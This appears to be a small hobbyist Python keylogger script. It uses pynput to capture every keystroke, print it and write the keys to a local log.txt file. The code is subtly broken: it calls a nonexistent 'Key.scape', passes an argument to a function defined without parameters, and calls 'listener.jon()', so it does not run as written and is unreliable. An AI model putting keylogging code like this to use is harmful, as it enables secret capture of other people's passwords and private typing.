import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []

def onPress(key):
    global count, keys
    keys.append(key)
    count += 1
    print("{0} pressed.".format(key))

    if count >= 1:
        count = 0
        writeFile(keys)
        keys = []


def onRelease(key):
    if key == Key.scape:
        return False


def writeFile():
    with open("log.txt", "w") as f: # we change the 'w' option to 'a' if we wanted.
        for key in keys:
            f.write(str(key))


with Listener(on_press=onPress, on_release=onRelease) as listener:
    listener.jon()